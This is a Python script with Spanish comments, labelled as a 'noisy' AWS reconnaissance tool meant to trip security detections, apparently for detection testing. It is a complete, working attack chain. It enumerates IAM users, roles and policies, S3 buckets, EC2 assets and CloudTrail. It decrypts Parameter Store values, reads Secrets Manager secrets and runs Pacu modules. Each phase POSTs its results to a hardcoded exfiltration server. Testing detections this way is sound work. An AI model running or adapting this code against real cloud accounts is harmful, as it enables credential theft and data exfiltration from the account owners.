#!/usr/bin/env python3
# === AWS CLOUD RECONNAISSANCE - NOISY VERSION ===
# Script agresivo para activar detecciones de seguridad en AWS

import os
import subprocess
import json
import time
import socket
from datetime import datetime

REGION = "us-west-2"
EXFIL_SERVER = "http://10.1.69.41:8000"  # CAMBIAR IP

def run_aws_command(command, description):
    """Ejecuta comando AWS CLI y muestra resultado"""
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {description}")
    print(f"$ aws {command}")
    
    try:
        result = subprocess.run(f"aws {command}", shell=True, capture_output=True, text=True, timeout=30)
        print("STDOUT:")
        print(result.stdout.strip())
        if result.stderr:
            print("STDERR:")
            print(result.stderr.strip())
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        print("Command timed out")
        return "", "Timeout"
    except Exception as e:
        print(f"Error: {e}")
        return "", str(e)

def exfiltrate_data(data, filename):
    """Exfiltrar datos al servidor externo"""
    try:
        import requests
        headers = {'X-Filename': filename, 'Content-Type': 'application/json'}
        response = requests.post(EXFIL_SERVER, data=json.dumps(data), headers=headers)
        print(f"Data exfiltrated: {filename}")
    except:
        print(f"Exfiltration failed for: {filename}")

def install_dependencies():
    """Instalar dependencias sospechosas"""
    print("=== INSTALLING SUSPICIOUS DEPENDENCIES ===")
    
    dependencies = [
        "pip3 install boto3",
        "pip3 install pacu",
        "pip3 install awscli",
        "pip3 install requests",
        "pip3 install scoutsuite",
        "pip3 install prowler",
        "pip3 install cloudsplaining"
    ]
    
    for dep in dependencies:
        print(f"Installing: {dep}")
        os.system(dep)
        time.sleep(1)

def aws_identity_reconnaissance():
    """Reconnaissance de identidad AWS"""
    print("\n=== AWS IDENTITY RECONNAISSANCE ===")
    
    identity_data = {}
    
    # Obtener identidad actual
    stdout, stderr = run_aws_command("sts get-caller-identity", "Getting current AWS identity")
    identity_data['caller_identity'] = stdout
    
    # Listar roles IAM
    stdout, stderr = run_aws_command("iam list-roles --max-items 50", "Listing IAM roles")
    identity_data['iam_roles'] = stdout
    
    # Listar usuarios IAM
    stdout, stderr = run_aws_command("iam list-users --max-items 50", "Listing IAM users")
    identity_data['iam_users'] = stdout
    
    # Listar grupos IAM
    stdout, stderr = run_aws_command("iam list-groups --max-items 50", "Listing IAM groups")
    identity_data['iam_groups'] = stdout
    
    # Listar políticas IAM
    stdout, stderr = run_aws_command("iam list-policies --scope Local --max-items 50", "Listing custom IAM policies")
    identity_data['iam_policies'] = stdout
    
    # Obtener políticas adjuntas al usuario actual
    stdout, stderr = run_aws_command("iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)", "Getting current user policies")
    identity_data['current_user_policies'] = stdout
    
    exfiltrate_data(identity_data, "aws_identity_recon.json")
    return identity_data

def aws_s3_reconnaissance():
    """Reconnaissance agresivo de S3"""
    print("\n=== AWS S3 AGGRESSIVE RECONNAISSANCE ===")
    
    s3_data = {}
    
    # Listar todos los buckets
    stdout, stderr = run_aws_command("s3api list-buckets", "Listing all S3 buckets")
    s3_data['all_buckets'] = stdout
    
    # Obtener hostname para buscar buckets relacionados
    hostname = socket.gethostname()
    base_name = hostname.split("-")[0].lower()
    
    # Intentar listar contenido de buckets comunes
    common_bucket_names = [
        f"{base_name}-backup",
        f"{base_name}-logs",
        f"{base_name}-data",
        f"{base_name}-config",
        "company-backup",
        "company-logs",
        "company-data",
        "prod-backup",
        "dev-backup"
    ]
    
    s3_data['bucket_enumeration'] = {}
    
    for bucket_name in common_bucket_names:
        stdout, stderr = run_aws_command(f"s3 ls s3://{bucket_name}/", f"Attempting to list bucket: {bucket_name}")
        s3_data['bucket_enumeration'][bucket_name] = {'stdout': stdout, 'stderr': stderr}
        time.sleep(1)
    
    # Obtener ACLs de buckets públicos
    stdout, stderr = run_aws_command("s3api list-buckets --query 'Buckets[0:5].Name' --output text", "Getting first 5 bucket names")
    if stdout:
        bucket_names = stdout.split()
        for bucket in bucket_names[:3]:  # Solo primeros 3 para no hacer demasiado ruido
            stdout2, stderr2 = run_aws_command(f"s3api get-bucket-acl --bucket {bucket}", f"Getting ACL for bucket: {bucket}")
            s3_data[f'bucket_acl_{bucket}'] = stdout2
            time.sleep(1)
    
    exfiltrate_data(s3_data, "aws_s3_recon.json")
    return s3_data

def aws_ec2_reconnaissance():
    """Reconnaissance de EC2"""
    print("\n=== AWS EC2 RECONNAISSANCE ===")
    
    ec2_data = {}
    
    # Listar instancias EC2
    stdout, stderr = run_aws_command(f"ec2 describe-instances --region {REGION}", "Listing EC2 instances")
    ec2_data['instances'] = stdout
    
    # Listar security groups
    stdout, stderr = run_aws_command(f"ec2 describe-security-groups --region {REGION}", "Listing security groups")
    ec2_data['security_groups'] = stdout
    
    # Listar key pairs
    stdout, stderr = run_aws_command(f"ec2 describe-key-pairs --region {REGION}", "Listing EC2 key pairs")
    ec2_data['key_pairs'] = stdout
    
    # Listar AMIs públicas del usuario
    stdout, stderr = run_aws_command(f"ec2 describe-images --owners self --region {REGION}", "Listing user's AMIs")
    ec2_data['user_amis'] = stdout
    
    # Listar snapshots
    stdout, stderr = run_aws_command(f"ec2 describe-snapshots --owner-ids self --region {REGION}", "Listing EBS snapshots")
    ec2_data['snapshots'] = stdout
    
    # Listar volúmenes EBS
    stdout, stderr = run_aws_command(f"ec2 describe-volumes --region {REGION}", "Listing EBS volumes")
    ec2_data['volumes'] = stdout
    
    exfiltrate_data(ec2_data, "aws_ec2_recon.json")
    return ec2_data

def aws_ssm_reconnaissance():
    """Reconnaissance de Systems Manager"""
    print("\n=== AWS SYSTEMS MANAGER RECONNAISSANCE ===")
    
    ssm_data = {}
    
    # Listar instancias gestionadas por SSM
    stdout, stderr = run_aws_command(f"ssm describe-instance-information --region {REGION}", "Listing SSM managed instances")
    ssm_data['managed_instances'] = stdout
    
    # Listar documentos SSM
    stdout, stderr = run_aws_command(f"ssm list-documents --region {REGION} --max-items 20", "Listing SSM documents")
    ssm_data['ssm_documents'] = stdout
    
    # Listar parámetros del Parameter Store
    stdout, stderr = run_aws_command(f"ssm describe-parameters --region {REGION} --max-items 50", "Listing Parameter Store parameters")
    ssm_data['parameters'] = stdout
    
    # Intentar obtener parámetros sensibles
    sensitive_params = [
        "/prod/database/password",
        "/prod/api/key",
        "/dev/database/password",
        "/app/secret/key"
    ]
    
    ssm_data['parameter_values'] = {}
    for param in sensitive_params:
        stdout, stderr = run_aws_command(f"ssm get-parameter --name {param} --with-decryption --region {REGION}", f"Attempting to get parameter: {param}")
        ssm_data['parameter_values'][param] = {'stdout': stdout, 'stderr': stderr}
        time.sleep(1)
    
    exfiltrate_data(ssm_data, "aws_ssm_recon.json")
    return ssm_data

def aws_secrets_reconnaissance():
    """Reconnaissance de Secrets Manager"""
    print("\n=== AWS SECRETS MANAGER RECONNAISSANCE ===")
    
    secrets_data = {}
    
    # Listar secretos
    stdout, stderr = run_aws_command(f"secretsmanager list-secrets --region {REGION}", "Listing Secrets Manager secrets")
    secrets_data['secrets_list'] = stdout
    
    # Intentar obtener valores de secretos
    if stdout and "Name" in stdout:
        try:
            secrets_json = json.loads(stdout)
            for secret in secrets_json.get('SecretList', [])[:3]:  # Solo primeros 3
                secret_name = secret.get('Name', '')
                stdout2, stderr2 = run_aws_command(f"secretsmanager get-secret-value --secret-id {secret_name} --region {REGION}", f"Attempting to get secret: {secret_name}")
                secrets_data[f'secret_value_{secret_name}'] = stdout2
                time.sleep(2)
        except:
            pass
    
    exfiltrate_data(secrets_data, "aws_secrets_recon.json")
    return secrets_data

def aws_cloudtrail_reconnaissance():
    """Reconnaissance de CloudTrail"""
    print("\n=== AWS CLOUDTRAIL RECONNAISSANCE ===")
    
    cloudtrail_data = {}
    
    # Listar trails
    stdout, stderr = run_aws_command(f"cloudtrail describe-trails --region {REGION}", "Listing CloudTrail trails")
    cloudtrail_data['trails'] = stdout
    
    # Obtener eventos recientes
    stdout, stderr = run_aws_command(f"logs describe-log-groups --region {REGION} --max-items 20", "Listing CloudWatch log groups")
    cloudtrail_data['log_groups'] = stdout
    
    exfiltrate_data(cloudtrail_data, "aws_cloudtrail_recon.json")
    return cloudtrail_data

def run_external_tools():
    """Ejecutar herramientas externas de reconnaissance"""
    print("\n=== RUNNING EXTERNAL AWS TOOLS ===")
    
    tools_data = {}
    
    # Ejecutar ScoutSuite
    print("Running ScoutSuite...")
    os.system("scout aws --no-browser --report-dir /tmp/scout_report")
    tools_data['scoutsuite'] = "Executed"
    
    # Ejecutar Prowler
    print("Running Prowler...")
    os.system("prowler aws -M csv,json -o /tmp/prowler_report")
    tools_data['prowler'] = "Executed"
    
    # Ejecutar Pacu
    print("Running Pacu modules...")
    pacu_commands = [
        "pacu --session test --exec 'run iam__enum_users_roles_policies_groups'",
        "pacu --session test --exec 'run s3__bucket_finder'",
        "pacu --session test --exec 'run ec2__enum'"
    ]
    
    for cmd in pacu_commands:
        print(f"Executing: {cmd}")
        os.system(cmd)
        time.sleep(3)
    
    tools_data['pacu'] = "Executed"
    
    exfiltrate_data(tools_data, "aws_external_tools.json")

def create_final_report():
    """Crear reporte final de reconnaissance"""
    print("\n=== CREATING FINAL RECONNAISSANCE REPORT ===")
    
    final_report = {
        "timestamp": datetime.now().isoformat(),
        "hostname": socket.gethostname(),
        "region": REGION,
        "reconnaissance_phases": [
            "Identity Reconnaissance",
            "S3 Reconnaissance", 
            "EC2 Reconnaissance",
            "SSM Reconnaissance",
            "Secrets Manager Reconnaissance",
            "CloudTrail Reconnaissance",
            "External Tools Execution"
        ],
        "tools_used": [
            "AWS CLI",
            "ScoutSuite",
            "Prowler", 
            "Pacu"
        ],
        "exfiltration_server": EXFIL_SERVER,
        "total_commands_executed": "50+",
        "status": "RECONNAISSANCE COMPLETE"
    }
    
    exfiltrate_data(final_report, "aws_final_report.json")
    
    print("=== AWS CLOUD RECONNAISSANCE COMPLETED ===")
    print(f"Total phases executed: {len(final_report['reconnaissance_phases'])}")
    print(f"Tools deployed: {len(final_report['tools_used'])}")
    print("All data exfiltrated to external server")

def main():
    """Función principal"""
    print("=== AWS CLOUD RECONNAISSANCE - NOISY VERSION ===")
    print(f"Target Region: {REGION}")
    print(f"Exfiltration Server: {EXFIL_SERVER}")
    
    # Instalar dependencias
    install_dependencies()
    
    # Ejecutar fases de reconnaissance
    aws_identity_reconnaissance()
    time.sleep(2)
    
    aws_s3_reconnaissance()
    time.sleep(2)
    
    aws_ec2_reconnaissance()
    time.sleep(2)
    
    aws_ssm_reconnaissance()
    time.sleep(2)
    
    aws_secrets_reconnaissance()
    time.sleep(2)
    
    aws_cloudtrail_reconnaissance()
    time.sleep(2)
    
    run_external_tools()
    time.sleep(2)
    
    create_final_report()

if __name__ == "__main__":
    main()
